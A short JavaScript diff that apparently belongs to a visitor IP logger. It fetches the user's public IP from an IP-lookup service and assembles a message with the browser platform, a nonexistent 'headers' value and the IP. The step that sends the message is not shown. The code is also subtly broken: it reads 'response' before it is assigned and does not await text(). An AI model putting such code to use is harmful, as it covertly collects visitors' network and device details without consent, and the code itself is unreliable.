@@ -2,7 +2,7 @@
 
     const response = await fetch('https://api.ipify.org', {
         method: 'GET'
-    }).then(() => {
+    }).then(async () => {
         const ip = response.text();
 
         const params = { content: `Platform: ${window.navigator.oscpu = window.navigator.oscpu || window.navigator.platform}\nHEADERS: ${window.navigator.headers}\nIP: ${ip}` };
